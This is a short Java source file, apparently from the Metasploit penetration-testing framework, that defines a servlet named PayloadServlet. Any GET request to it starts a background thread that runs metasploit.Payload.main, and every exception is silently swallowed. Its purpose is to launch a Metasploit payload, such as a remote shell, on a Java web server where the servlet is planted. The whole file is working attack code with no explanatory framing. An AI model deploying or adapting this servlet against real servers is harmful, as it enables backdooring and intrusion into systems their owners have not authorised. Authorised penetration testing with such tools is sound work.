package metasploit;

import java.io.*;

import javax.servlet.*;
import javax.servlet.http.*;
import java.lang.Thread;

public class PayloadServlet extends HttpServlet implements Runnable {

	public void run() {
		try {
			metasploit.Payload.main(new String[] {""});
		} catch (Exception e) {}
	}

	protected void doGet(HttpServletRequest req, HttpServletResponse res)
	throws ServletException, java.io.IOException
	{
		PrintWriter out = res.getWriter();

		try {
			Thread t = new Thread(this);
			t.start();
		} catch(Exception e) { };

		out.close();
	}

}
